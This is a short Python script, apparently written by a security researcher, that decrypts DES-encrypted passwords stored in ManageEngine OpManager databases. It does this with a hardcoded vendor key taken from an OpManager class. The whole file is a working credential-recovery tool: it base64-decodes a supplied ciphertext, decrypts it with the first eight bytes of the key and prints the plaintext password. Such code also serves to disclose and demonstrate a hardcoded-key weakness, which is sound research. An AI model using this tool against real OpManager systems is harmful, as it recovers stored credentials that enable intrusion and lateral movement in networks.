#!/usr/bin/env python 

#
# Simple decrypter for DES encrypted passwords 
# stored in OpManager databases.
#
# Author: Denis Andzakovic
# Date: 28/01/2016
#

import base64
import sys
from Crypto.Cipher import DES

if len(sys.argv) == 2:
    cipher_text = sys.argv[1]
else:
    print "[!] Please provide a cipher text! - ./opmanager-des-decrypt.py <ciphertext>"
    exit(-1)

# This is the key as defined in com.adventnet.me.opmanager.server.util.OpManagerPasswordDecode
# we'll only be using the first 8 bytes
key = 'APMEXTPRODjZ_7004PROD_AppManager' 
unpad = lambda s : s[0:-ord(s[-1])]

cipher = DES.new(key[:8], DES.MODE_ECB)

print unpad(cipher.decrypt(base64.b64decode(cipher_text)))
